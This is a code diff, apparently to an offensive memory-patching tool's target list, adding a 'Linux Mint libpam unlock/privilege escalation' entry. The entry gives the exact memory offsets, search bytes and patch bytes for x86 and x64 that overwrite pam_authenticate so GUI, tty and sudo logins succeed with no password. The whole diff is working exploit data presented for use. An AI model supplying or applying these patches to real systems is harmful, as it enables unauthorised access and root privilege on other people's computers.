@@ -468,23 +468,42 @@ Target(
         ]
     ),
 Target(
-    name=None,
-    note=None,
+    name='Linux Mint libpam unlock/privilege escalation',
+    note='Overwrites the pam_authenticate return value. After running, all '
+    'PAM-based authentications (e.g., GUI, tty and sudo) will work with no '
+    'password.',
     signatures=[
         Signature(
-            os=None,
-            os_versions=[],
-            os_architectures=['x86', 'x64'],
+            os='Linux Mint',
+            os_versions=['11', '12', '13'],
+            os_architectures=['x86'],
             executable=None,
             version=None,
             md5=None,
             tag=False,
-            offsets=[],
+            offsets=[0xebd, 0xbaf, 0xa7f],
             chunks=[
                 Chunk(
-                    chunk=None,
+                    chunk=0x83f81f89c774,
                     chunkoffset=0x00,
-                    patch=None,
+                    patch=0xbf00000000eb,
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os='Linux Mint',
+            os_versions=['11', '12', '13'],
+            os_architectures=['x64'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x838, 0x5b8, 0x3c8],
+            chunks=[
+                Chunk(
+                    chunk=0x83f81f89c574,
+                    chunkoffset=0x00,
+                    patch=0xbd00000000eb,
                     patchoffset=0x00)
                 ]
             )
